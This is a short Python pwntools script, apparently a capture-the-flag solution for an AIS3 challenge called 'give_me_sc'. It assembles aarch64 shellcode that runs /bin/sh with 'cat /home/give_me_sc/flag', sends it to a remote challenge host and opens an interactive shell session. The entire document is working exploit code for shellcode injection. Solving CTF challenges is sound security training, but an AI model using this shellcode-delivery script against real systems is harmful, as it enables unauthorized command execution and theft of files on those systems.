
from pwn import *
context.arch='aarch64'
context.terminal = ['tmux', 'splitw', '-h']
a = pwnlib.asm.dpkg_search_for_binutils('aarch64', 'as')
print(a)


# shcode = shellcraft.execve("/bin/sh", 0, 0)
shcode = shellcraft.aarch64.linux.sh()
shcode = shellcraft.execve("/bin/sh", ["sh", "-c", "cat /home/give_me_sc/flag"], 0)
asm_code = asm(shcode)
print(asm_code)


r = remote('chals1.ais3.org', 15566)
# r = process('./chal/share/give_me_sc')

r.sendafter("What's your name:\n", b"/bin/sh")
r.sendafter("Give me shellcode:\n", asm_code)
r.interactive()
